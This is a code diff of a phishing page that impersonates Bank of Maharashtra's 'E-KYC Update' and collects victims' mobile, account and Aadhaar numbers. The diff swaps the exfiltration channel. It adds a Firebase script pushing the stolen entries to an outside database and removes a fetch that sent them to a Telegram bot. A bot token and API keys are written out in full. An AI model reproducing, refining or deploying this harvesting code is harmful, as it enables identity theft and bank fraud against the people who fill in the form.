@@ -3,6 +3,44 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script type="module">
+    // Firebase config
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
+      authDomain: "marcokinghoga.firebaseapp.com",
+      projectId: "marcokinghoga",
+      storageBucket: "marcokinghoga.firebasestorage.app",
+      messagingSenderId: "132474071601",
+      appId: "1:132474071601:web:7c44a66fca6dc000e90310",
+      databaseURL: "https://marcokinghoga-default-rtdb.firebaseio.com"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    window.submitForm = function () {
+      const mobile = document.getElementById("mobile").value.trim();
+      const account = document.getElementById("account").value.trim();
+      const customerid = document.getElementById("customerid").value.trim();
+
+      // Push data to Firebase
+      push(ref(db, "ekyc_entries"), {
+        mobile,
+        account,
+        aadhaar: customerid,
+        timestamp: new Date().toISOString()
+      }).then(() => {
+        window.location.href = "cardpage.html";
+      }).catch((error) => {
+        alert("Failed to submit: " + error.message);
+      });
+
+      return false;
+    }
+  </script>
   <style>
     body {
       font-family: Arial;
@@ -35,10 +73,6 @@
       background: #ffffff00;
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 0 0px rgba(0,0,0,0.1);
-    }
-    .headline {
-      margin-top: 0px;
     }
     .headline h1 {
       font-size: 22px;
@@ -80,8 +114,7 @@
   </style>
 </head>
 <body>
-
-  <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Meri Tasveer">
+  <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Logo">
 
   <div class="headline">
     <h1>Welcome To Digital Banking<br>E-KYC Update</h1>
@@ -92,44 +125,25 @@
     <form onsubmit="return validateForm();">
       <div class="input-group">
         <label for="mobile">Mobile Number</label>
-        <input type="tel" id="mobile" name="mobile" maxlength="10" placeholder="Enter 10-digit Mobile" required>
-        <div class="error" id="mobileError"> ⚠️ Mobile Number.</div>
+        <input type="tel" id="mobile" name="mobile" maxlength="10" required placeholder="Enter 10-digit Mobile">
+        <div class="error" id="mobileError">⚠️ Enter valid Mobile Number.</div>
       </div>
       <div class="input-group">
         <label for="account">CIF/Account Number</label>
-        <input type="tel" id="account" name="account" maxlength="11" placeholder="Enter 11-digit Account No." required>
-        <div class="error" id="accountError">Please enter a valid 11-digit Account Number.</div>
+        <input type="tel" id="account" name="account" maxlength="11" required placeholder="Enter 11-digit Account No.">
+        <div class="error" id="accountError">⚠️ Enter valid 11-digit Account Number.</div>
       </div>
       <div class="input-group">
         <label for="customerid">Aadhaar Number</label>
-        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Customer ID" required>
-        <div class="error" id="aadhaarError">Please enter a valid 12-digit Aadhaar Number.</div>
+        <input type="tel" id="customerid" name="customerid" maxlength="12" required placeholder="Enter 12-digit Aadhaar No.">
+        <div class="error" id="aadhaarError">⚠️ Enter valid 12-digit Aadhaar Number.</div>
       </div>
       <button class="side-button" type="submit">Continue</button>
     </form>
 
-    <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg" alt="Extra Image 1">
-    <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Extra Image 2">
+    <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg">
+    <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg">
   </div>
-
-  <!-- Firebase SDKs -->
-  <script type="module">
-    // Firebase import
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-
-    // Your Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
-      authDomain: "marcokinghoga.firebaseapp.com",
-      projectId: "marcokinghoga",
-      storageBucket: "marcokinghoga.firebasestorage.app",
-      messagingSenderId: "132474071601",
-      appId: "1:132474071601:web:7c44a66fca6dc000e90310"
-    };
-
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-  </script>
 
   <script>
     function validateForm() {
@@ -139,13 +153,11 @@
       const account = document.getElementById("account").value.trim();
       const customerid = document.getElementById("customerid").value.trim();
 
-      const mobilePattern = /^[6-9][0-9]{9}$/;
-
       document.getElementById("mobileError").style.display = "none";
       document.getElementById("accountError").style.display = "none";
       document.getElementById("aadhaarError").style.display = "none";
 
-      if (!mobilePattern.test(mobile)) {
+      if (!/^[6-9][0-9]{9}$/.test(mobile)) {
         document.getElementById("mobileError").style.display = "block";
         isValid = false;
       }
@@ -161,19 +173,7 @@
       }
 
       if (isValid) {
-        const message = `🧾 E-KYC Submission\n📱 Mobile: ${mobile}\n🏦 Account: ${account}\n🆔 Aadhaar: ${customerid}`;
-        const url = `https://api.telegram.org/bot8194227351:AAFvq912-UCW3_8PugBn5qLgK7lddVfq5pM/sendMessage?chat_id=8032862702&text=${encodeURIComponent(message)}`;
-
-        fetch(url)
-          .then(response => {
-            if (response.ok) {
-              window.location.href = "cardpage.html";
-            } else {
-              alert("Failed to send data. Please try again.");
-            }
-          });
-
-        return false;
+        return submitForm(); // Call Firebase submit
       }
 
       return false;
